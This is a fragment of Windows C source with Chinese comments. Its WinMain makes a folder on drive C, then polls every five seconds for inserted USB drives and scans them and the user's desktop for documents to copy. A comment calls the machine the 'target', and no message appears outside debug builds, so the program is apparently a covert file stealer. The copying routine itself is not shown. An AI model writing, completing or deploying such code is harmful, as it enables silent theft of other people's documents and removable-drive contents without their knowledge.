INT APIENTRY WinMain(	HINSTANCE	hInstance,
						HINSTANCE	hPrevInstance, 
						LPSTR		lpCmdLine, 
						INT			iCmdShow  )
{
	// 创建C盘下的目标文件夹
	CreateDirectoryA(szTmpPath, NULL);

	char szBuf[100];
	ZeroMemory(szBuf, sizeof(szBuf));

 	while (TRUE)
 	{
		Sleep(5000);
		// 获得当前磁盘等驱动器信息
		DWORD len = GetLogicalDriveStringsA(sizeof(szBuf), szBuf);

		for (char *pDrive = szBuf; *pDrive != NULL; pDrive += strlen(pDrive)+1) {
			char *pDrivePath = pDrive;
			// 获取驱动器类型信息，简单起见，不区分软驱和U盘（目标机器没有软驱...）
			if (GetDriveTypeA(pDrivePath) ==DRIVE_REMOVABLE) {
#ifdef MY_DEBUG
				char szShow[50] = "发现U盘，位于 ";
				strcat(szShow, pDrivePath);
				MessageBoxA(NULL, szShow, "信息", MB_OK);
#endif
				FindDocFile(pDrivePath);
			}
		}
		// 获取桌面路径
		LPITEMIDLIST pidl;   
		char szDesktopDir[MAX_PATH];  
		if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl))) {    
			SHGetPathFromIDListA(pidl, szDesktopDir);    
		}
		strcat(szDesktopDir, "\\");
		// 拷贝桌面的文档
		FindDocFile(szDesktopDir);
	}

	return 0;
}